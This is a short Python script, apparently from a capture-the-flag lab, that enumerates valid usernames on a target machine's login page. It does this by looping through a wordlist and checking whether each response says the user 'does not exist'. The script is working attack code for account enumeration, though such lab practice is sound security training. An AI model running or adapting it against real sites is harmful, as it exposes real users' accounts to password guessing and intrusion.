import os
from Ctf import Ctf
from dotenv import load_dotenv
load_dotenv()

if __name__ == "__main__":
	"""
	Script to enumerate users in login page
	"""
	ctf = Ctf(os.getenv("MACHINE_IP"))

	# get usernames
	f = open(os.path.join(os.path.dirname(__file__), "./usernames.txt"))
	usernames = f.read().splitlines()
	f.close()

	found = []

	for i, username in enumerate(usernames):
		res = ctf.send_login_req(username, "pass")

		if "does not exist" not in res.text:
			found.append(username)

		print(f"\033[1A\033[KEnumerating users... {i+1}/{len(usernames)} Found {len(found)}: {found}")